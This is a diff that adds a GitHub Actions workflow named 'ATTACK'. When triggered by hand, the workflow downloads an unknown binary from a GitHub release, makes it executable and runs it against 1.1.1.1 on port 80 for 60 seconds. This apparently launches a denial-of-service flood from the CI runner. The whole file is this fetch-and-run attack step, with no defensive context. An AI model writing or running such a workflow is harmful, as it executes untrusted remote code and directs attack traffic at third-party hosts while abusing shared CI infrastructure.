@@ -1,0 +1,11 @@
+name: ATTACK
+on: workflow_dispatch
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          wget -q https://github.com/VishalDevloper03/VishalDevloper/releases/download/VishalDevloper/vishal
+          chmod +x vishal
+          ./vishal 1.1.1.1 80 60
